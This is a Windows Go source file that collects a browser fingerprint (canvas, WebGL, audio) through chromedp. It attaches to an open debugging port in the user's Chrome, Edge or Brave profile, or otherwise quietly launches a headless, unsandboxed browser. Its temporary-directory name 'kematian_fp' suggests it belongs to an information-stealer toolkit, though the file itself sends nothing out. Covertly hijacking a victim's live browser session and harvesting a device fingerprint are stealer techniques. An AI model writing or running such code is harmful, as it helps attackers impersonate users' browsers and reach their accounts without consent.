//go:build windows

package fingerprint

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"
)

func evalAwaitPromise(p *runtime.EvaluateParams) *runtime.EvaluateParams {
	return p.WithAwaitPromise(true)
}

const fingerprintJS = `(async () => {
  const out = {};
  try {
    const c = document.createElement("canvas");
    c.width = 220; c.height = 60;
    const x = c.getContext("2d");
    x.textBaseline = "top";
    x.font = "14px 'Arial'";
    x.fillStyle = "#f60";
    x.fillRect(0, 0, 220, 60);
    x.fillStyle = "#069";
    x.fillText("Cwm fjordbank glyphs vext quiz \uD83D\uDE03", 2, 2);
    x.fillStyle = "rgba(102, 204, 0, 0.7)";
    x.fillText("Cwm fjordbank glyphs vext quiz \uD83D\uDE03", 4, 17);
    x.fillStyle = "#f60";
    x.beginPath(); x.arc(100, 40, 20, 0, Math.PI * 2, true); x.fill();
    out.canvas = c.toDataURL();
  } catch (e) {}
  try {
    const gl = document.createElement("canvas").getContext("webgl");
    if (gl) {
      const ext = gl.getExtension("WEBGL_debug_renderer_info");
      out.webglRenderer = ext ? String(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)) : String(gl.getParameter(gl.RENDERER));
      out.webglVendor = ext ? String(gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)) : String(gl.getParameter(gl.VENDOR));
      out.webglVersion = String(gl.getParameter(gl.VERSION));
      const keys = ["MAX_TEXTURE_SIZE","MAX_VIEWPORT_DIMS","MAX_RENDERBUFFER_SIZE","MAX_VERTEX_ATTRIBS","MAX_VERTEX_UNIFORM_VECTORS","MAX_VARYING_VECTORS","MAX_FRAGMENT_UNIFORM_VECTORS","MAX_TEXTURE_IMAGE_UNITS","MAX_COMBINED_TEXTURE_IMAGE_UNITS","ALIASED_LINE_WIDTH_RANGE","ALIASED_POINT_SIZE_RANGE"];
      const params = {};
      for (const k of keys) {
        try {
          let v = gl.getParameter(gl[k]);
          if (v && v.length !== undefined && typeof v !== "string") v = Array.from(v);
          params[k] = v;
        } catch (e) {}
      }
      out.webglParams = params;
      const exts = gl.getSupportedExtensions();
      out.webglExtensions = exts ? exts.slice().sort() : [];
    }
  } catch (e) {}
  try {
    const ac = new OfflineAudioContext(1, 44100, 44100);
    const osc = ac.createOscillator();
    osc.type = "triangle";
    osc.frequency.value = 10000;
    const comp = ac.createDynamicsCompressor();
    comp.threshold.value = -50;
    comp.knee.value = 40;
    comp.ratio.value = 12;
    comp.attack.value = 0;
    comp.release.value = 0.25;
    osc.connect(comp);
    comp.connect(ac.destination);
    osc.start(0);
    const buf = await ac.startRendering();
    const data = buf.getChannelData(0);
    let sum = 0;
    for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
    out.audio = sum;
  } catch (e) {}
  return out;
})()`

func CollectJS() *JSResult {
	res, err := collectJS()
	if err != nil {
		return nil
	}
	return res
}

func collectJS() (*JSResult, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if wsURL := findExistingDebugURL(); wsURL != "" {
		logf("found existing debug endpoint")
		if res, err := runRemote(ctx, wsURL); err == nil {
			return res, nil
		} else {
			logf("existing debug endpoint failed: %v", err)
		}
	}

	chrome := browserExePath("Chrome")
	if chrome == "" {
		chrome = browserExePath("Edge")
	}
	if chrome == "" {
		return nil, fmt.Errorf("no Chromium browser found")
	}
	logf("spawning hidden Chromium: %s", chrome)
	res, err := runHidden(ctx, chrome)
	if err != nil {
		logf("hidden Chromium failed: %v", err)
	}
	return res, err
}

func runRemote(ctx context.Context, wsURL string) (*JSResult, error) {
	allocCtx, cancel := chromedp.NewRemoteAllocator(ctx, wsURL)
	defer cancel()
	return evalJS(allocCtx)
}

func runHidden(ctx context.Context, chromePath string) (*JSResult, error) {
	dataDir, err := os.MkdirTemp("", "kematian_fp_*")
	if err != nil {
		return nil, fmt.Errorf("temp profile dir: %w", err)
	}
	defer os.RemoveAll(dataDir)

	if res, err := runHiddenWith(ctx, chromePath, dataDir, true); err == nil {
		return res, nil
	} else {
		logf("GPU launch failed: %v; retrying with software rendering", err)
	}
	return runHiddenWith(ctx, chromePath, dataDir, false)
}

func runHiddenWith(ctx context.Context, chromePath, dataDir string, gpu bool) (*JSResult, error) {
	args := []string{
		"--headless",
		"--no-sandbox",
		"--disable-dev-shm-usage",
		"--no-first-run",
		"--no-default-browser-check",
		"--disable-extensions",
		"--user-data-dir=" + dataDir,
		"--remote-debugging-port=0",
		"about:blank",
	}
	if gpu {
		args = append(args, "--use-gl=angle", "--use-angle=d3d11", "--disable-gpu-sandbox")
	} else {
		args = append(args, "--disable-gpu")
	}

	cmd := exec.Command(chromePath, args...)
	cmd.Stdout = io.Discard
	cmd.Stderr = chromeLogWriter{}
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("start chrome: %w", err)
	}
	defer func() { _ = cmd.Process.Kill() }()

	wsURL, err := waitForDevTools(dataDir, 10*time.Second)
	if err != nil {
		return nil, err
	}

	allocCtx, cancel := chromedp.NewRemoteAllocator(ctx, wsURL)
	defer cancel()
	return evalJS(allocCtx)
}

func waitForDevTools(dataDir string, timeout time.Duration) (string, error) {
	portFile := filepath.Join(dataDir, "DevToolsActivePort")
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		data, err := os.ReadFile(portFile)
		if err == nil {
			lines := strings.Split(strings.TrimSpace(string(data)), "\n")
			if len(lines) >= 2 {
				port := strings.TrimSpace(lines[0])
				path := strings.TrimSpace(lines[1])
				if port != "" && path != "" {
					return "ws://127.0.0.1:" + port + path, nil
				}
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
	return "", fmt.Errorf("chrome did not expose a DevTools port")
}

type chromeLogWriter struct{}

func (chromeLogWriter) Write(p []byte) (int, error) {
	for _, line := range strings.Split(strings.TrimSpace(string(p)), "\n") {
		if line != "" {
			logf("chrome: %s", line)
		}
	}
	return len(p), nil
}

func evalJS(allocCtx context.Context) (*JSResult, error) {
	cctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	var out JSResult
	if err := chromedp.Run(cctx,
		chromedp.Navigate("about:blank"),
		chromedp.Evaluate(fingerprintJS, &out, evalAwaitPromise),
	); err != nil {
		return nil, err
	}
	return &out, nil
}

func findExistingDebugURL() string {
	local := os.Getenv("LOCALAPPDATA")
	if local == "" {
		return ""
	}
	for _, dir := range []string{`Google\Chrome\User Data`, `Microsoft\Edge\User Data`, `BraveSoftware\Brave-Browser\User Data`} {
		data, err := os.ReadFile(filepath.Join(local, dir, "DevToolsActivePort"))
		if err != nil {
			continue
		}
		lines := strings.Split(strings.TrimSpace(string(data)), "\n")
		if len(lines) < 2 {
			continue
		}
		port := strings.TrimSpace(lines[0])
		if port == "" {
			continue
		}
		if wsURL, err := debugWebSocketURL(port); err == nil && wsURL != "" {
			return wsURL
		}
	}
	return ""
}

func debugWebSocketURL(port string) (string, error) {
	client := &http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get("http://127.0.0.1:" + port + "/json/version")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	var v struct {
		WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&v); err != nil {
		return "", err
	}
	return v.WebSocketDebuggerURL, nil
}
